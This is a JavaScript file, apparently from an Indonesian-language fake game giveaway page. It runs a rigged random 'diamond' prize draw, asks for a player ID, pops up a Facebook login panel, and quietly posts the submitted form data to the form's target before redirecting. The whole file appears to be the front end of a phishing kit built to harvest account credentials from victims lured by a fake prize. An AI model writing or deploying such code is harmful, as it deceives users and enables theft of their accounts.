let num1 = null
let num2 = null
let num3 = null

const random = () => {
  for (var i = 0; i <= 300; i++) {
    setTimeout(() => {
      num1 = Math.floor(Math.random() * 4) + 6;
      num2 = Math.floor(Math.random() * 9);
      num3 = Math.floor(Math.random() * 9);
      document.getElementById('num1').innerHTML = num1;
      document.getElementById('num2').innerHTML = num2;
      document.getElementById('num3').innerHTML = num3;
      document.getElementById('Draw').innerHTML = 'selamat anda mendapatkan ' + num1 + num2 + num3 + ' diamond'
    }, i * 20);
  };
  document.getElementById('Draw').onclick = ''
}

const toSpin = () => {
  let element = document.getElementById('spin');
  let offset = element.getBoundingClientRect().top;
  window.scrollTo({
    top: offset,
    behavior: 'smooth'
  });
}

const confirm = () => {
  if (sukses) {
    document.getElementById('popup').style.display = 'grid'
  }
  else {
    let element = document.getElementById('title');
    let offset = element.getBoundingClientRect().top;
    window.scrollTo({
      top: offset,
      behavior: 'smooth'
    });
    document.getElementById('alertId').style.color = 'red'
    document.getElementById('alertId').innerHTML = 'Mohon masukan ID anda!'
  }
}

const facebookLogin = () => {
  document.getElementById('loginPopup').style.display = 'none'
  document.getElementById('facebook').style.display = 'flex'
}

const contactForm = document.getElementById("form");


contactForm.addEventListener("submit", function(e) {
  e.preventDefault();
  const url = e.target.action;
  const formData = new FormData(contactForm);

  fetch(url, {
      method: "POST",
      body: formData,
      mode: "no-cors",
    })
    .then(() => {
      window.location.href='/index.html'
    })
    .catch((e) => alert("Error occured"));
});